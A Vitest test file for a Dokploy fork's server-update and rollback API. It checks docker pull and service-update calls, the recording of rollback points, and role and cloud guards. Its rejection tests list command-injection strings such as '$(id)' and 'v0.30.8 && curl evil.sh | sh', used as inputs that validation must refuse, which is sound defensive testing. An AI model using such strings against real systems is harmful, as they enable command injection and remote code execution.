import { beforeEach, describe, expect, it, vi } from "vitest";
import packageInfo from "../../package.json";

const state = vi.hoisted(() => ({ isCloud: false }));

const mocks = vi.hoisted(() => ({
	getUpdateData: vi.fn(),
	readDokployRollbackPoint: vi.fn(),
	recordDokployRollbackPoint: vi.fn(),
	runBackgroundJob: vi.fn(),
	spawnAsync: vi.fn(),
	audit: vi.fn(async (_ctx: unknown, _event: unknown) => undefined),
}));

vi.mock("@dokploy/server", () => ({
	get IS_CLOUD() {
		return state.isCloud;
	},
	getUpdateData: mocks.getUpdateData,
	readDokployRollbackPoint: mocks.readDokployRollbackPoint,
	recordDokployRollbackPoint: mocks.recordDokployRollbackPoint,
	runBackgroundJob: mocks.runBackgroundJob,
	spawnAsync: mocks.spawnAsync,
}));

vi.mock("@dokploy/server/lib/auth", () => ({
	validateRequest: vi.fn(),
}));

vi.mock("@/server/api/utils/audit", () => ({
	audit: mocks.audit,
}));

vi.mock("@/server/queues/queueSetup", () => ({
	cleanAllDeploymentQueue: vi.fn(),
}));

vi.mock("@/server/utils/backup", () => ({
	removeJob: vi.fn(),
	schedule: vi.fn(),
}));

const { settingsRouter } = await import("@/server/api/routers/settings");

const callerAs = (role: string) =>
	settingsRouter.createCaller({
		session: { activeOrganizationId: "org-a" },
		user: { id: "user-1", email: "admin@example.com", role },
	} as Parameters<typeof settingsRouter.createCaller>[0]);

const caller = callerAs("owner");

const REPO = "ghcr.io/devinosolutions/dokploy-community";
const DIGEST = `sha256:${"ab12".repeat(16)}`;

let jobs: Promise<unknown>[] = [];
let failures: unknown[] = [];

// The docker argv of every spawn the background job ran.
const spawned = async () => {
	await Promise.all(jobs);
	return mocks.spawnAsync.mock.calls.map(([command, args]) => [
		command,
		...(args as string[]),
	]);
};

const serviceUpdate = (image: string) => [
	"docker",
	"service",
	"update",
	"--force",
	"--image",
	image,
	"dokploy",
];

beforeEach(() => {
	vi.clearAllMocks();
	state.isCloud = false;
	jobs = [];
	failures = [];
	// Like the real one: runs the job and never rejects.
	mocks.runBackgroundJob.mockImplementation(
		(_label: string, job: () => unknown) => {
			const run = Promise.resolve()
				.then(job)
				.catch((error) => {
					failures.push(error);
				});
			jobs.push(run);
			return run;
		},
	);
	mocks.spawnAsync.mockResolvedValue(Buffer.from(""));
	mocks.recordDokployRollbackPoint.mockResolvedValue(undefined);
	mocks.readDokployRollbackPoint.mockResolvedValue(null);
	mocks.getUpdateData.mockResolvedValue({
		latestVersion: "v0.30.9-community.1",
		updateAvailable: true,
	});
});

describe("settings.updateServer without a target", () => {
	it("installs :<latestVersion> exactly as before, with no pull", async () => {
		await expect(caller.updateServer()).resolves.toBe(true);

		expect(mocks.getUpdateData).toHaveBeenCalledWith(packageInfo.version);
		expect(await spawned()).toEqual([
			serviceUpdate(`${REPO}:v0.30.9-community.1`),
		]);
		expect(mocks.runBackgroundJob).toHaveBeenCalledWith(
			"settings.updateServer background",
			expect.any(Function),
		);
		expect(mocks.audit).toHaveBeenCalledOnce();
		expect(mocks.audit.mock.calls[0]![1]).toStrictEqual({
			action: "update",
			resourceType: "settings",
			resourceName: "dokploy-version",
		});
	});

	it("records the running image before the update", async () => {
		await caller.updateServer();
		await Promise.all(jobs);

		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
		);
		expect(
			mocks.recordDokployRollbackPoint.mock.invocationCallOrder[0],
		).toBeLessThan(mocks.spawnAsync.mock.invocationCallOrder[0]!);
	});

	it("does nothing when no update is available", async () => {
		mocks.getUpdateData.mockResolvedValue({
			latestVersion: packageInfo.version,
			updateAvailable: false,
		});

		await expect(caller.updateServer()).resolves.toBe(true);

		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
	});

	it("treats an empty input like no input", async () => {
		await caller.updateServer({});

		expect(await spawned()).toEqual([
			serviceUpdate(`${REPO}:v0.30.9-community.1`),
		]);
	});
});

describe("settings.updateServer with a pinned target", () => {
	it.each([
		["v0.30.8-community.32.1", `${REPO}:v0.30.8-community.32.1`],
		["v0.30.8", `${REPO}:v0.30.8`],
		[DIGEST, `${REPO}@${DIGEST}`],
	])("%s pulls and installs %s from the fork repo", async (target, image) => {
		await expect(caller.updateServer({ target })).resolves.toBe(true);

		expect(mocks.getUpdateData).not.toHaveBeenCalled();
		expect(await spawned()).toEqual([
			["docker", "pull", image],
			serviceUpdate(image),
		]);
		// Recorded after the pull, before the service update.
		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
		);
		const [pull, update] = mocks.spawnAsync.mock.invocationCallOrder;
		const [record] = mocks.recordDokployRollbackPoint.mock.invocationCallOrder;
		expect(pull).toBeLessThan(record!);
		expect(record).toBeLessThan(update!);
		expect(mocks.audit.mock.calls[0]![1]).toStrictEqual({
			action: "update",
			resourceType: "settings",
			resourceName: "dokploy-version",
			metadata: { target, rollback: false },
		});
	});

	it("installs an older release too (a downgrade is a pin)", async () => {
		mocks.getUpdateData.mockResolvedValue({
			latestVersion: packageInfo.version,
			updateAvailable: false,
		});

		await caller.updateServer({ target: "v0.30.8-community.31" });

		expect(await spawned()).toContainEqual(
			serviceUpdate(`${REPO}:v0.30.8-community.31`),
		);
	});

	it("keeps the service and the rollback point when the pull fails", async () => {
		mocks.spawnAsync.mockRejectedValueOnce(new Error("manifest unknown"));

		await caller.updateServer({ target: "v9.9.9" });

		await Promise.all(jobs);
		expect(failures).toEqual([new Error("manifest unknown")]);
		expect(mocks.spawnAsync).toHaveBeenCalledOnce();
		expect(mocks.spawnAsync.mock.calls[0]![1]).toEqual([
			"pull",
			`${REPO}:v9.9.9`,
		]);
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
	});

	it.each([
		"latest",
		"canary",
		"v0.30.8 ",
		" v0.30.8",
		"v0.30.8\n",
		"v0.30.8;id",
		"v0.30.8 && curl evil.sh | sh",
		"$(id)",
		"`id`",
		"ghcr.io/evil/dokploy-community:v0.30.8",
		"dokploy/dokploy:v0.30.8",
		`${REPO}:v0.30.8`,
		`${REPO}@${DIGEST}`,
		`evil.io/x@${DIGEST}`,
		`${DIGEST} --detach`,
		"--help",
		"",
	])("rejects %j before anything runs", async (target) => {
		await expect(caller.updateServer({ target })).rejects.toMatchObject({
			code: "BAD_REQUEST",
		});

		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
	});

	it("rejects a target together with rollback", async () => {
		await expect(
			caller.updateServer({ target: "v0.30.8", rollback: true }),
		).rejects.toMatchObject({ code: "BAD_REQUEST" });
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
	});
});

describe("settings.updateServer rollback", () => {
	it("installs the recorded digest through the pinned path", async () => {
		mocks.readDokployRollbackPoint.mockResolvedValue({
			version: "v0.30.8-community.31",
			digest: DIGEST,
		});

		await expect(caller.updateServer({ rollback: true })).resolves.toBe(true);

		expect(mocks.readDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
		);
		expect(mocks.getUpdateData).not.toHaveBeenCalled();
		expect(await spawned()).toEqual([
			["docker", "pull", `${REPO}@${DIGEST}`],
			serviceUpdate(`${REPO}@${DIGEST}`),
		]);
		expect(mocks.audit.mock.calls[0]![1]).toMatchObject({
			resourceName: "dokploy-version",
			metadata: { target: DIGEST, rollback: true },
		});
	});

	it("re-validates the recorded digest", async () => {
		mocks.readDokployRollbackPoint.mockResolvedValue({
			version: "v0.30.8-community.31",
			digest: `${DIGEST}; id`,
		});

		await expect(caller.updateServer({ rollback: true })).rejects.toMatchObject(
			{ code: "BAD_REQUEST" },
		);
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
	});

	it("refuses when no previous version is recorded", async () => {
		await expect(caller.updateServer({ rollback: true })).rejects.toMatchObject(
			{ code: "BAD_REQUEST", message: expect.stringContaining("roll back") },
		);
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
	});
});

describe("settings.getUpdateRollback", () => {
	it("offers the recorded previous version", async () => {
		const point = { version: "v0.30.8-community.31", digest: DIGEST };
		mocks.readDokployRollbackPoint.mockResolvedValue(point);

		await expect(caller.getUpdateRollback()).resolves.toEqual(point);
		expect(mocks.readDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
		);
	});

	it("offers nothing when no point is recorded", async () => {
		await expect(caller.getUpdateRollback()).resolves.toBeNull();
	});
});

describe("permission and cloud guards", () => {
	it.each([
		["update", () => callerAs("member").updateServer()],
		[
			"pinned update",
			() => callerAs("member").updateServer({ target: "v0.30.8" }),
		],
		["rollback", () => callerAs("member").updateServer({ rollback: true })],
		["rollback lookup", () => callerAs("member").getUpdateRollback()],
	])("a member can't run the %s", async (_name, run) => {
		await expect(run()).rejects.toMatchObject({ code: "UNAUTHORIZED" });
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
	});

	it("an admin can run a pinned update", async () => {
		await expect(
			callerAs("admin").updateServer({ target: "v0.30.8" }),
		).resolves.toBe(true);
	});

	it("does nothing on cloud", async () => {
		state.isCloud = true;
		mocks.readDokployRollbackPoint.mockResolvedValue({
			version: "v0.30.8-community.31",
			digest: DIGEST,
		});

		await expect(caller.updateServer({ target: "v0.30.8" })).resolves.toBe(
			true,
		);
		await expect(caller.updateServer({ rollback: true })).resolves.toBe(true);
		await expect(caller.getUpdateRollback()).resolves.toBeNull();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
	});
});
